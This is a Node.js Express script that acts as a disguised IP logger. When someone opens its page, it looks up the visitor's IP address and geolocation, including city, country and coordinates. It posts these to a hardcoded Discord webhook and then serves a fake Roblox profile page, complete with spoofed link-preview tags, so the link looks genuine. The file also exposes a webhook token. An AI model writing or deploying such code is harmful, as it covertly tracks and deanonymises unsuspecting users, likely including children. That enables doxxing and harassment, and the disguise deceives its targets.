const express = require('express');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const axios = require('axios');

const app = express();
const PORT = 3000;
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz'; 

app.use(requestIp.mw());

app.get('/', async (req, res) => {
    const clientIp = req.clientIp;
    const geo = geoip.lookup(clientIp);

    const ipInfo = `
🌐 **IP Log** 🌐
\`\`\`
📡 IPv4: ${clientIp}
📶 IPv6: ${req.headers['x-forwarded-for'] || 'N/A'}
🏙️ City: ${geo?.city || 'Unknown'}
🇺🇳 Country: ${geo?.country || 'Unknown'}
📱 ISP: ${geo?.isp || 'Unknown'}
📍 Coordinates: ${geo?.ll ? `${geo.ll[0]}, ${geo.ll[1]}` : 'Unknown'}
\`\`\`
    `;

    try {
        await axios.post(WEBHOOK_URL, {
            embeds: [{
                title: "🌐 IP Log",
                description: ipInfo,
                color: 0x3498db,
                timestamp: new Date().toISOString()
            }]
        });
    } catch (error) {
        console.error('Error sending to webhook');
    }

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="hat_manAaccLT's Profile">
    <meta property="og:description" content="hat_manAaccLT is one of the millions creating and exploring the endless possibilities of Roblox. Join hat_manAaccLT on Roblox and explore together!">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://tr.rbxcdn.com/30DAY-Avatar-46AD06A715B3A3129679C7AC6DE51019-Png/352/352/Avatar/Webp/noFilter">
    <meta property="og:site_name" content="Roblox">
    <meta name="theme-color" content="#333333">
    <title>hat_manAaccLT's Profile</title>
    <style>
        body {
            background-color: #333333;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        a {
            color: #1E90FF;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>hat_manAaccLT's Profile</h1>
    <p>hat_manAaccLT is one of the millions creating and exploring the endless possibilities of Roblox. Join hat_manAaccLT on Roblox and explore together!</p>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
